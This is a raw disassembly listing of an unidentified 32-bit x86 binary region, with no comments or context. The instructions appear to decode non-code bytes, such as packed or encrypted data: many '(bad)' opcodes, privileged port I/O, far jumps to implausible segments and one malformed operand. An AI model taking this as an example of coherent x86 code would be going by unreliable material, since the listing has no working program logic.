  41d3ad:	into   
  41d3ae:	and    al,0x2e
  41d3b0:	sub    edx,edx
  41d3b2:	adc    esi,DWORD PTR [ebp+ebp*4-0x20b43abb]
  41d3b9:	xor    al,0xae
  41d3bb:	dec    eax
  41d3bc:	retf   0xd80
  41d3bf:	das    
  41d3c0:	fld    QWORD PTR [ebx-0x239d3d7c]
  41d3c6:	sub    BYTE PTR [edi],bl
  41d3c8:	ins    DWORD PTR es:[edi],dx
  41d3c9:	mov    esp,0xc3a78b47
  41d3ce:	or     ebx,ecx
  41d3d0:	mov    eax,0x5573263e
  41d3d5:	jo     0x41d3e5
  41d3d7:	inc    eax
  41d3d8:	outs   dx,DWORD PTR ds:[esi]
  41d3d9:	jle    0x41d37a
  41d3db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3dc:	fadd   QWORD PTR [edi+edi*1]
  41d3df:	cdq    
  41d3e0:	xchg   edx,eax
  41d3e1:	arpl   si,si
  41d3e3:	xchg   ecx,eax
  41d3e4:	push   cs
  41d3e5:	cmc    
  41d3e6:	sbb    cl,ch
  41d3e8:	pop    ecx
  41d3e9:	mov    dl,0xa8
  41d3eb:	lods   eax,DWORD PTR ds:[esi]
  41d3ec:	sub    al,0xb
  41d3ee:	js     0x41d450
  41d3f0:	in     eax,0x76
  41d3f2:	jno    0x41d41e
  41d3f4:	mov    ?,esi
  41d3f6:	inc    esi
  41d3f7:	fst    QWORD PTR [eax-0x1608ed48]
  41d3fd:	fisttp DWORD PTR [ebp-0x505ae2ff]
  41d403:	mov    cl,0x4b
  41d405:	in     al,0xff
  41d407:	js     0x41d3cb
  41d409:	sbb    al,dl
  41d40b:	inc    eax
  41d40d:	push   es
  41d40e:	push   ebx
  41d40f:	fldenv [ebp-0x3e]
  41d412:	mov    fs,WORD PTR [edx]
  41d414:	pop    esp
  41d415:	jmp    0x41d411
  41d417:	dec    ebp
  41d418:	test   BYTE PTR [ecx],bh
  41d41a:	push   es
  41d41b:	lods   eax,DWORD PTR ds:[esi]
  41d41c:	sahf   
  41d41d:	std    
  41d41e:	or     BYTE PTR [edi+0x79],dl
  41d421:	addr16 stc 
  41d423:	(bad)  
  41d424:	mov    cl,0x8c
  41d426:	call   0xae6c4d7f
  41d42b:	jge    0x41d467
  41d42d:	sar    DWORD PTR [ebp+0x1e40b3fd],1
  41d433:	xchg   ebp,eax
  41d434:	lods   eax,DWORD PTR ds:[esi]
  41d435:	iret   
  41d436:	dec    eax
  41d437:	fstp   QWORD PTR ds:0x17f895c
  41d43d:	leave  
  41d43e:	push   cs
  41d43f:	xor    al,BYTE PTR [edx+0x6b]
  41d442:	xchg   ecx,eax
  41d443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d444:	mov    al,ds:0x84a6ce6d
  41d449:	push   esp
  41d44a:	cmp    eax,0xbd55a131
  41d44f:	push   edx
  41d450:	push   edx
  41d451:	shr    esi,cl
  41d453:	popa   
  41d454:	and    BYTE PTR [ecx-0x2a2ef53c],ah
  41d45a:	dec    ecx
  41d45b:	dec    edi
  41d45c:	cmc    
  41d45d:	adc    ebp,DWORD PTR [ecx]
  41d45f:	dec    esp
  41d460:	adc    BYTE PTR [ebx-0x71],0x39
  41d464:	adc    al,0xef
  41d466:	pop    ebx
  41d467:	fdivp  st(5),st
  41d469:	fisubr WORD PTR [edx]
  41d46b:	or     al,BYTE PTR [esp+edx*2]
  41d46e:	out    dx,al
  41d46f:	(bad)
  41d472:	cli    
  41d473:	fldl2t 
  41d475:	stos   BYTE PTR es:[edi],al
  41d476:	mov    ecx,0x65486af4
  41d47b:	in     al,0x42
  41d47d:	lahf   
  41d47e:	mov    ds:0xe92805d,al
  41d483:	int    0x3e
  41d485:	shl    DWORD PTR [edi-0x27fac2b8],1
  41d48b:	inc    esi
  41d48c:	sbb    eax,0xcb1c9a66
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd03e:0x6b850289
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xbd000001
  41d50d:	in     al,0x45
  41d50f:	pop    ebp
  41d510:	ins    BYTE PTR es:[edi],dx
  41d511:	cwde   
  41d512:	lahf   
  41d513:	cmp    ah,BYTE PTR [eax-0x75298d5b]
  41d519:	outs   dx,DWORD PTR es:[esi]
  41d51b:	mov    al,0x59
  41d51d:	push   ebp
  41d51e:	mov    bl,0x35
  41d520:	mov    ebp,0xff2e6e7d
  41d525:	mov    bh,0x38
  41d527:	xor    eax,DWORD PTR [edx+0x7]
  41d52a:	pop    edx
  41d52b:	push   cs
  41d52c:	sub    cl,BYTE PTR [eax-0x46f16822]
  41d532:	stos   BYTE PTR es:[edi],al
  41d533:	das    
  41d534:	jmp    0x661b:0xf03d0336
  41d53b:	call   0x7f94:0xfeb9cb1a
  41d542:	gs pop ebp
  41d544:	inc    eax
  41d545:	fadd   st(2),st
  41d547:	sbb    al,bh
  41d549:	or     BYTE PTR [ecx+0x64],cl
  41d54c:	mov    dl,BYTE PTR [edi+edx*8-0xceadd37]
  41d553:	jmp    0x41d594
  41d555:	xchg   edx,eax
  41d556:	lods   eax,DWORD PTR ds:[esi]
  41d557:	pop    eax
  41d558:	cli    
  41d559:	push   eax
  41d55a:	push   eax
  41d55b:	mov    ah,0xd1
  41d55d:	xchg   esp,eax
  41d55e:	imul   ebx,DWORD PTR [ebx+0xa],0x56
  41d562:	in     eax,dx
  41d563:	sbb    al,0x65
  41d565:	out    0x45,al
  41d567:	push   0xffffff9c
  41d569:	jne    0x41d4eb
  41d56b:	retf   0xfb78
  41d56e:	ds sbb al,ch
  41d571:	mov    ds:0x9465dc19,al
  41d576:	int    0x49
  41d578:	popa   
  41d579:	in     eax,dx
  41d57a:	xor    DWORD PTR [edi+0x607826fc],0x7b2bd403
  41d584:	push   eax
  41d585:	or     DWORD PTR [edx+0x6dd4cfd2],ebx
  41d58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d58c:	jg     0x41d532
  41d58e:	pop    eax
  41d58f:	or     al,0x87
  41d591:	inc    ebp
  41d592:	sbb    DWORD PTR [edi-0xb],ecx
  41d595:	lock push ebp
  41d597:	push   0x8b752f71
  41d59c:	lahf   
  41d59d:	call   0x7918f3c1
  41d5a2:	les    ebp,FWORD PTR [ecx-0x6f268ef0]
  41d5a8:	inc    esp
  41d5a9:	and    esp,edx
  41d5ab:	jp     0x41d534
  41d5ad:	in     al,0x21
  41d5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b0:	jbe    0x41d591
  41d5b2:	aad    0x40
  41d5b4:	lahf   
  41d5b5:	adc    edx,DWORD PTR [ebp-0x35]
  41d5b8:	leave  
  41d5b9:	outs   dx,DWORD PTR ds:[esi]
  41d5ba:	or     DWORD PTR [edx+0x2218c2da],edi
  41d5c0:	cmp    BYTE PTR [ecx-0x80],bh
  41d5c3:	in     al,0xf5
  41d5c5:	cmp    ah,0xa0
  41d5c8:	add    bl,BYTE PTR [ebx-0x2c]
  41d5cb:	dec    eax
  41d5cc:	mov    ecx,0xf0c4bd7d
  41d5d1:	push   esp
  41d5d2:	xor    al,0x13
  41d5d4:	dec    ebx
  41d5d5:	repnz sahf 
  41d5d7:	mov    BYTE PTR [eax],ch
  41d5d9:	int3   
  41d5da:	popa   
  41d5db:	push   es
  41d5dc:	sub    al,0xb5
  41d5de:	cmp    dh,BYTE PTR [esi+0xd]
  41d5e1:	cwde   
  41d5e2:	pop    eax
  41d5e3:	xor    ebx,DWORD PTR [edx-0x2e8cd0a3]
  41d5e9:	adc    DWORD PTR [eax+0x12],eax
  41d5ec:	push   es
  41d5ed:	jno    0x41d576
  41d5ef:	push   ecx
  41d5f0:	pop    eax
  41d5f1:	xchg   ebx,eax
  41d5f2:	imul   edx,ebx,0xffffffd3
  41d5f5:	add    DWORD PTR [edi-0x7d],edi
  41d5f8:	ins    DWORD PTR es:[edi],dx
  41d5f9:	jae    0x41d5dc
  41d5fb:	push   eax
  41d5fc:	icebp  
  41d5fd:	sbb    eax,0x6e248abf
  41d602:	sar    cl,0x89
  41d605:	clc    
  41d606:	xchg   ebp,eax
  41d607:	ret    
  41d608:	ds dec sp
  41d60b:	add    DWORD PTR [ebx-0x55c3ae8f],0x0
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xaa66e435
  41d681:	int3   
  41d682:	mov    esi,0x138d5d2
  41d687:	add    BYTE PTR ds:0xe6000001,al
  41d68d:	sub    al,0xbf
  41d68f:	push   esi
  41d690:	in     eax,dx
  41d691:	leave  
  41d692:	hlt    
  41d693:	cwde   
  41d694:	fild   QWORD PTR [ecx+0x1f]
  41d697:	das    
  41d698:	outs   dx,BYTE PTR ds:[esi]
  41d699:	pushf  
  41d69a:	out    0xec,al
  41d69c:	jle    0x41d6e7
  41d69e:	inc    edi
  41d69f:	pop    ds
  41d6a0:	push   cs
  41d6a1:	outs   dx,DWORD PTR ds:[esi]
  41d6a2:	int3   
  41d6a3:	xor    ebx,DWORD PTR [ebp+0x30]
  41d6a6:	ret    0x2765
  41d6a9:	xchg   ebx,eax
  41d6aa:	inc    edx
  41d6ab:	daa    
  41d6ac:	jns    0x41d697
  41d6ae:	mov    ch,cl
  41d6b0:	cmc    
  41d6b1:	jbe    0x41d6dc
  41d6b3:	jmp    0xf20:0x3d1a5622
  41d6ba:	jl     0x41d65a
  41d6bc:	pop    ss
  41d6bd:	mov    BYTE PTR [edx+0x10],dl
  41d6c0:	imul   esi,edx,0x3c474f7c
  41d6c6:	mov    ah,0xa6
  41d6c8:	xchg   ebx,eax
  41d6c9:	inc    edx
  41d6ca:	dec    edx
  41d6cb:	push   0x38
  41d6cd:	xchg   edi,eax
  41d6ce:	sbb    al,0xf6
  41d6d0:	(bad)  
  41d6d1:	loope  0x41d71b
  41d6d3:	mov    ebx,0x2e173ea2
  41d6d8:	aad    0x77
  41d6da:	jbe    0x41d6ae
  41d6dc:	and    ebx,DWORD PTR [edi]
  41d6de:	jp     0x41d68a
  41d6e0:	retf   0xaa7a
  41d6e3:	enter  0x83ed,0xcf
  41d6e7:	or     cl,BYTE PTR [ebp+0x4f]
  41d6ea:	adc    eax,0xf4efab22
  41d6ef:	jmp    0x41d683
  41d6f1:	mov    ch,BYTE PTR [edi-0x58bbd7b1]
  41d6f7:	pop    eax
  41d6f8:	ror    DWORD PTR [eax],1
  41d6fa:	and    DWORD PTR [edx],esi
  41d6fc:	dec    edi
  41d6fd:	inc    eax
  41d6fe:	call   0xb2e6acbe
  41d703:	adc    DWORD PTR [ebx+0x1a],esp
  41d706:	dec    esp
  41d707:	mov    al,dl
  41d709:	xchg   edi,eax
  41d70a:	dec    edi
  41d70b:	pusha  
  41d70c:	xchg   BYTE PTR [edi],bl
  41d70e:	pop    ecx
  41d70f:	popa   
  41d710:	adc    esp,ebp
  41d712:	xchg   ecx,eax
  41d713:	ins    BYTE PTR es:[edi],dx
  41d714:	mov    DWORD PTR [edx+edi*2+0x7e34ab87],0xe438ec61
  41d71f:	lods   al,BYTE PTR ds:[esi]
  41d720:	sub    al,0x6e
  41d722:	call   DWORD PTR ds:0x34a5718d
  41d728:	das    
  41d729:	inc    ecx
  41d72a:	loope  0x41d75f
  41d72c:	aad    0xc0
  41d72e:	mov    DWORD PTR [ecx+0x4d],ebx
  41d731:	outs   dx,BYTE PTR ds:[esi]
  41d732:	repz ja 0x41d731
  41d735:	pusha  
  41d736:	ins    BYTE PTR es:[edi],dx
  41d737:	or     ah,0xbc
  41d73a:	adc    al,0xd4
  41d73d:	sahf   
  41d73e:	mov    ah,0x53
  41d740:	loope  0x41d709
  41d742:	cs out 0xfc,al
  41d745:	mov    eax,ds:0xdb3fbea2
  41d74a:	dec    edx
  41d74b:	lds    ecx,FWORD PTR [eax]
  41d74d:	inc    edx
  41d74e:	jge    0x41d772
  41d750:	push   0xdeeccdbf
  41d755:	outs   dx,DWORD PTR cs:[esi]
  41d757:	push   edi
  41d758:	mov    BYTE PTR [ebp+0x7c53db0d],ah
  41d75e:	outs   dx,BYTE PTR ds:[esi]
  41d75f:	lock outs dx,DWORD PTR ds:[esi]
  41d761:	xchg   edx,eax
  41d762:	mov    eax,0x8d29ecef
  41d767:	jmp    0xd1de:0x6c5da5b6
  41d76e:	lods   al,BYTE PTR ds:[esi]
  41d76f:	loopne 0x41d71d
  41d771:	mov    esp,0x973840bb
  41d776:	fdivp  st(4),st
  41d778:	aaa    
  41d779:	mov    eax,ds:0x41848e6d
  41d77e:	shl    DWORD PTR [ebx+0x7cf65c3],0x9e
  41d785:	push   es
  41d786:	inc    edi
  41d787:	jb     0x41d70c
  41d789:	loope  0x41d768
  41d78b:	mov    ebx,0x4883928a
  41d790:	sbb    al,0x0
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	push   ds
  41d801:	jno    0x41d790
  41d803:	sub    ebx,edx
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR ds:0xde000001,al
  41d80d:	out    0xb3,eax
  41d80f:	dec    esi
  41d810:	dec    ebp
  41d811:	mov    dl,0xe
  41d813:	inc    esi
  41d814:	or     al,0xd4
  41d816:	fmulp  st(2),st
  41d818:	ins    DWORD PTR es:[edi],dx
  41d819:	adc    bl,BYTE PTR [ecx]
  41d81b:	or     BYTE PTR [ebx-0x54],ch
  41d81e:	sti    
  41d81f:	cld    
  41d820:	addr16 loopne 0x41d835
  41d823:	push   ebp
  41d824:	rcr    BYTE PTR [esi],cl
  41d826:	adc    al,0x81
  41d828:	dec    esi
  41d829:	(bad)  
  41d82a:	and    bl,BYTE PTR [ecx]
  41d82c:	cmp    edx,DWORD PTR ds:0x2a3aa7d8
  41d832:	je     0x41d839
  41d834:	fsubr  st(0),st
  41d836:	out    0x43,eax
  41d838:	sub    eax,0x7d99aba5
  41d83d:	js     0x41d7d7
  41d83f:	jb     0x41d89c
  41d841:	idiv   BYTE PTR [ebx*2-0x57bcfe6c]
  41d848:	xchg   BYTE PTR [edx-0x6d7bde9c],al
  41d84e:	std    
  41d84f:	push   0x50
  41d851:	xchg   ecx,eax
  41d852:	pop    es
  41d853:	out    0xf2,al
  41d855:	in     al,0x6e
  41d857:	inc    eax
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d85a:	int    0x9d
  41d85c:	mov    bl,0x70
  41d85e:	or     BYTE PTR [ecx-0x4b],0xd7
  41d862:	jp     0x41d886
  41d864:	push   es
  41d865:	pop    eax
  41d866:	fcomp  QWORD PTR [ebp+ecx*2-0x14]
  41d86a:	sub    al,0x43
  41d86c:	pop    esi
  41d86d:	push   0x71e9c727
  41d872:	(bad)  
  41d873:	fld    DWORD PTR [eax]
  41d875:	dec    eax
  41d876:	fmul   QWORD PTR [ecx+0x297c768e]
  41d87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d87d:	pop    edi
  41d87e:	fidivr DWORD PTR [ebp-0x63c95e23]
  41d884:	aam    0xc8
  41d886:	mov    al,ds:0xaffad3e6
  41d88b:	call   0xb112069f
  41d890:	ficomp DWORD PTR [ebp+0x2b5f4e1d]
  41d896:	sti    
  41d897:	ja     0x4bada012
  41d89d:	mov    edx,0x29e8221c
  41d8a2:	stc    
  41d8a3:	inc    ecx
  41d8a4:	nop
  41d8a5:	pop    esp
  41d8a6:	mov    ecx,0x2b5bcff5
  41d8ab:	push   ebx
  41d8ac:	and    sp,WORD PTR [eax+0x16]
  41d8b0:	sub    edx,ecx
  41d8b2:	les    esi,FWORD PTR [ecx-0x11]
  41d8b5:	dec    eax
  41d8b6:	or     edi,esi
  41d8b8:	pop    esi
  41d8b9:	and    dh,BYTE PTR [edx+esi*1-0x73]
  41d8bd:	iret   
  41d8be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8bf:	stc    
  41d8c0:	add    bh,BYTE PTR [edi]
  41d8c2:	(bad)  [edx+esi*1]
  41d8c5:	fs push edx
  41d8c7:	popf   
  41d8c8:	jne    0x41d87a
  41d8ca:	mov    eax,0x37373f25
  41d8cf:	repnz in al,0xef
  41d8d2:	shl    edx,0xa5
  41d8d5:	jp     0x41d905
  41d8d7:	paddusb mm2,QWORD PTR [ebx-0x2104ecb0]
  41d8de:	cdq    
  41d8df:	in     eax,0x93
  41d8e1:	std    
  41d8e2:	mov    ebp,0xbe68ec90
  41d8e7:	cmp    al,cl
  41d8e9:	cmp    DWORD PTR [eax+0x65],ebp
  41d8ec:	int    0xde
  41d8ee:	inc    ebp
  41d8ef:	pop    edi
  41d8f0:	and    bl,cl
  41d8f2:	or     ecx,DWORD PTR [edx+0xd]
  41d8f5:	sahf   
  41d8f6:	icebp  
  41d8f7:	nop
  41d8f8:	outs   dx,BYTE PTR ds:[esi]
  41d8f9:	jmp    0xd3401e69
  41d8fe:	in     al,0x10
  41d900:	adc    edx,DWORD PTR [ebx]
  41d902:	adc    eax,0x5a31552e
  41d907:	jmp    0x41d8a7
  41d909:	cdq    
  41d90a:	push   ecx
  41d90b:	sbb    edi,DWORD PTR ds:0xdea6bb54
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	fsubr  QWORD PTR gs:[ebp+eiz*2-0x38]
  41d984:	fistp  QWORD PTR [edx]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0xd9000001
  41d98d:	mov    edi,0x86f89575
  41d992:	cmp    dl,dl
  41d994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d995:	add    DWORD PTR [ecx],eax
  41d997:	fisubr WORD PTR [edx+0x44f9bce6]
  41d99d:	out    0xa1,al
  41d99f:	enter  0xe7f1,0x90
  41d9a3:	or     al,0x4f
  41d9a5:	mov    esi,0x57be5428
  41d9aa:	pushf  
  41d9ab:	xchg   ebp,eax
  41d9ac:	inc    esp
  41d9ad:	add    al,0x21
  41d9af:	loop   0x41d9d2
  41d9b1:	mov    al,ds:0x1f0cfab
  41d9b6:	pop    ebx
  41d9b7:	int    0x90
  41d9b9:	inc    eax
  41d9ba:	mov    al,ds:0x724418c2
  41d9bf:	inc    ebp
  41d9c0:	icebp  
  41d9c1:	ret    0x6848
  41d9c4:	mov    WORD PTR [ebp+0x3eb50027],es
  41d9ca:	popf   
  41d9cb:	(bad)  
  41d9cc:	xlat   BYTE PTR ds:[ebx]
  41d9cd:	adc    edx,esi
  41d9cf:	mov    edx,0x55776921
  41d9d4:	jg     0x41d989
  41d9d6:	fidivr WORD PTR [edi+0x1c]
  41d9d9:	inc    ebp
  41d9da:	in     al,0x1
  41d9dc:	arpl   WORD PTR [eax-0x12],di
  41d9df:	shl    esp,1
  41d9e1:	adc    bh,al
  41d9e3:	test   BYTE PTR [ebx-0x366c53c8],cl
  41d9e9:	inc    edi
  41d9ea:	mov    esi,0xfe7b48c5
  41d9ef:	mov    ah,bh
  41d9f1:	sub    eax,0xa99b04bf
  41d9f6:	pop    edx
  41d9f7:	sub    bh,bh
  41d9f9:	out    0xa8,al
  41d9fb:	imul   edx,DWORD PTR [ebx+0x6977dd82],0x63702380
  41da05:	pop    esi
  41da06:	mov    ds:0x30929bd5,al
  41da0b:	pop    ebp
  41da0c:	or     eax,0x8c5cb05
  41da11:	ror    DWORD PTR [ebx+ecx*8-0x46e7543a],1
  41da18:	and    eax,0x38319392
  41da1d:	daa    
  41da1e:	xchg   edx,eax
  41da1f:	push   esi
  41da20:	lahf   
  41da21:	(bad)  
  41da22:	and    dl,BYTE PTR [ebp-0x600e10a5]
  41da28:	addr16 sbb al,0x13
  41da2b:	sbb    al,0xa6
  41da2d:	jecxz  0x41da9e
  41da2f:	mov    al,0xf4
  41da31:	gs int3 
  41da33:	and    dh,BYTE PTR [edx-0x4eec38d6]
  41da39:	sahf   
  41da3a:	fwait
  41da3b:	mov    BYTE PTR [edx+0x65],ch
  41da3e:	inc    eax
  41da3f:	xor    edi,DWORD PTR [eax+edi*1]
  41da42:	sub    edx,edi
  41da44:	ficomp DWORD PTR [eax+0x3b]
  41da47:	sbb    BYTE PTR [ecx-0xc],0x6f
  41da4b:	jmp    0x41d9ee
  41da4d:	mov    ss,WORD PTR [eax]
  41da4f:	mov    ch,ah
  41da51:	ror    BYTE PTR [ecx+0x10],1
  41da54:	push   0x2d
  41da56:	adc    BYTE PTR [ecx-0x39],cl
  41da59:	popa   
  41da5a:	push   edx
  41da5b:	sbb    eax,0x8ca77918
  41da60:	xor    DWORD PTR [ebx],edx
  41da62:	nop
  41da63:	pop    ss
  41da64:	push   0xffffffe0
  41da66:	pop    edi
  41da67:	dec    esi
  41da68:	mov    ds:0x40cda68a,al
  41da6d:	scas   al,BYTE PTR es:[edi]
  41da6e:	or     BYTE PTR [ecx+0x6f],dh
  41da71:	frstor [ebp+0x60]
  41da74:	(bad)  
  41da75:	mov    bl,0x34
  41da77:	adc    ecx,DWORD PTR ds:0x1f7205d5
  41da7d:	enter  0x4023,0xa5
  41da81:	inc    esp
  41da82:	cmc    
  41da83:	sub    edx,esp
  41da85:	icebp  
  41da86:	loope  0x41da08
  41da88:	stos   BYTE PTR es:[edi],al
  41da89:	pushf  
  41da8a:	add    eax,0x74e9b329
  41da8f:	sub    eax,0x9d
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x4e
  41db01:	pop    ds
  41db02:	adc    dl,BYTE PTR [esi-0x1c]
  41db05:	cmp    eax,DWORD PTR [ecx]
  41db07:	add    BYTE PTR ds:0x9e000001,al
  41db0d:	push   cs
  41db0e:	imul   eax,ebx,0x18
  41db11:	sub    DWORD PTR [edi+0x15],edx
  41db14:	jns    0x41db4f
  41db16:	pushf  
  41db17:	loop   0x41db45
  41db19:	mov    ah,0x17
  41db1b:	ficom  WORD PTR [edx+0x315f8313]
  41db21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db22:	les    esi,FWORD PTR [edx-0x7f90c5df]
  41db28:	inc    esi
  41db29:	mov    BYTE PTR [ebx],dh
  41db2b:	jae    0x41dabc
  41db2d:	sahf   
  41db2e:	cs test eax,0x7c547962
  41db34:	push   esp
  41db35:	pop    edi
  41db36:	(bad)  
  41db38:	add    eax,DWORD PTR [eax]
  41db3a:	inc    esi
  41db3b:	sti    
  41db3c:	mov    eax,ds:0x854a4d28
  41db41:	sub    BYTE PTR [esi+0x1a013f35],bl
  41db47:	outs   dx,DWORD PTR ds:[esi]
  41db48:	mov    dl,0x7a
  41db4a:	sahf   
  41db4b:	cdq    
  41db4c:	cmp    BYTE PTR gs:[ebx],bl
  41db4f:	lods   eax,DWORD PTR ds:[esi]
  41db50:	lods   al,BYTE PTR ds:[esi]
  41db51:	cs mov ebp,0xe9c34097
  41db57:	cwde   
  41db58:	addr16 add al,0xae
  41db5b:	sub    DWORD PTR [esi-0x5c98aac4],ebx
  41db61:	lock in al,0x87
  41db64:	fsubrp st(0),st
  41db66:	clc    
  41db67:	xchg   esp,eax
  41db68:	or     DWORD PTR [esi-0x1d683981],edx
  41db6e:	sbb    ebx,DWORD PTR ds:0xa1f42e8
  41db74:	add    DWORD PTR [edx+eiz*2],esi
  41db77:	jle    0x41db0c
  41db79:	sub    edi,esi
  41db7b:	fwait
  41db7c:	xor    BYTE PTR [ecx+eiz*8-0x4e],al
  41db80:	(bad)  
  41db81:	out    0xb0,al
  41db83:	and    ebp,DWORD PTR ds:0x8bd5d198
  41db89:	jmp    0x2fec:0xab07ac9d
  41db90:	cmp    dh,cl
  41db92:	stos   BYTE PTR es:[edi],al
  41db93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db94:	adc    eax,0x2c54f27a
  41db99:	add    al,0x2
  41db9b:	retf   
  41db9c:	cmp    BYTE PTR [ebx-0x80],dh
  41db9f:	xlat   BYTE PTR ds:[ebx]
  41dba0:	mov    dh,0xf4
  41dba2:	and    edi,ebp
  41dba4:	or     cl,ch
  41dba6:	dec    ecx
  41dba7:	cmp    bl,bh
  41dba9:	sub    al,0xff
  41dbab:	enter  0x5d22,0x82
  41dbaf:	sbb    BYTE PTR [ecx+0x3faa76b8],dl
  41dbb5:	sbb    al,0x9a
  41dbb7:	ss inc edx
  41dbb9:	lods   eax,DWORD PTR ds:[esi]
  41dbba:	mov    ah,0x8
  41dbbc:	mov    al,0x9c
  41dbbe:	inc    edi
  41dbbf:	and    esi,eax
  41dbc1:	push   0xffffffc7
  41dbc3:	out    dx,eax
  41dbc4:	xchg   DWORD PTR [ecx+0x2],eax
  41dbc7:	add    al,0x5e
  41dbc9:	push   esp
  41dbca:	mov    eax,0x8c862480
  41dbcf:	push   ecx
  41dbd0:	adc    BYTE PTR [ebx-0x61ce0928],dl
  41dbd6:	adc    al,0x91
  41dbd8:	mov    DWORD PTR [esi-0x16],edi
  41dbdb:	std    
  41dbdc:	mov    edx,0x102267e3
  41dbe1:	mov    dh,0xa4
  41dbe3:	cdq    
  41dbe4:	xor    DWORD PTR [edx+0x4a],0x33227d43
  41dbeb:	adc    si,WORD PTR [eax-0x58]
  41dbef:	xchg   ebx,eax
  41dbf0:	jae    0x41dc3d
  41dbf2:	push   cs
  41dbf3:	jo     0x41dc40
  41dbf5:	js     0x41dbcb
  41dbf7:	mov    ah,0x1c
  41dbf9:	push   ebp
  41dbfa:	aad    0x8c
  41dbfc:	rol    BYTE PTR [ebp-0xf],0x88
  41dc00:	test   DWORD PTR [ecx],ebp
  41dc02:	dec    eax
  41dc03:	lea    eax,[edi-0x67]
  41dc06:	mov    DWORD PTR [edi+0x32b98ddd],eax
  41dc0c:	cmp    DWORD PTR [ebp+0x540b14],0x0
	...
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi+0x30b0d050]
  41dc81:	aad    0xa3
  41dc83:	stos   BYTE PTR es:[edi],al
  41dc84:	jmp    0x541ddc5
  41dc89:	add    DWORD PTR [eax],eax
  41dc8b:	add    BYTE PTR [edx+0x76d16fb6],cl
  41dc91:	xor    eax,0xdc0de198
  41dc96:	jg     0x41dcc8
  41dc98:	or     esi,DWORD PTR [ecx-0x6192bedd]
  41dc9e:	inc    eax
  41dc9f:	push   ds
  41dca0:	cmp    BYTE PTR [eax+0x24dacf67],al
  41dca6:	lods   al,BYTE PTR ds:[esi]
  41dca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dca8:	xchg   esp,eax
  41dca9:	or     esi,DWORD PTR [edx-0x4864303b]
  41dcaf:	push   cs
  41dcb0:	jo     0x41dce7
  41dcb2:	sbb    ecx,edx
  41dcb4:	ret    
  41dcb5:	add    DWORD PTR [esi],esp
  41dcb7:	imul   ecx,DWORD PTR [edi-0x6dc1ac41],0xffffffa6
  41dcbe:	shr    BYTE PTR [edx+edx*8+0x9bd3cb1],0xb7
  41dcc6:	popa   
  41dcc7:	mov    edi,0x25c6e3b8
  41dccc:	jnp    0x41dcec
  41dcce:	jmp    0x2d7ce96f
  41dcd3:	add    al,0x5c
  41dcd5:	xlat   BYTE PTR ds:[ebx]
  41dcd6:	cld    
  41dcd7:	mul    DWORD PTR [esi]
  41dcd9:	mul    BYTE PTR [ebp-0x43cd8f16]
  41dcdf:	nop
  41dce0:	sbb    BYTE PTR [ebp-0x78],dh
  41dce3:	addr16 dec ebp
  41dce5:	fidiv  DWORD PTR [ebx-0x15]
  41dce8:	outs   dx,BYTE PTR ds:[esi]
  41dce9:	xor    al,BYTE PTR [edx-0x52310b3]
  41dcef:	dec    edx
  41dcf0:	rcr    DWORD PTR [ecx+0x5d245b7e],1
  41dcf6:	fistp  DWORD PTR [esi-0x302f0819]
  41dcfc:	icebp  
  41dcfd:	sub    eax,0xd1fdd2bb
  41dd02:	test   DWORD PTR [edx+0x745d5393],eax
  41dd08:	repz mov al,0x73
  41dd0b:	mov    ecx,0x1743ebb6
  41dd10:	out    0x6c,al
  41dd12:	dec    ecx
  41dd13:	sahf   
  41dd14:	shl    DWORD PTR [eax-0x29],cl
  41dd17:	pusha  
  41dd18:	aam    0xb4
  41dd1a:	sahf   
  41dd1b:	clc    
  41dd1c:	fild   DWORD PTR [ecx+esi*8-0x8]
  41dd20:	hlt    
  41dd21:	sar    eax,cl
  41dd23:	cli    
  41dd24:	into   
  41dd25:	loope  0x41dd6c
  41dd27:	stc    
  41dd28:	iret   
  41dd29:	sub    al,BYTE PTR [ebx]
  41dd2b:	fnstenv gs:[eax]
  41dd2e:	or     edx,edx
  41dd30:	sar    ecx,0x4d
  41dd33:	mov    ch,0xa0
  41dd35:	stos   BYTE PTR es:[edi],al
  41dd36:	jnp    0x41dd36
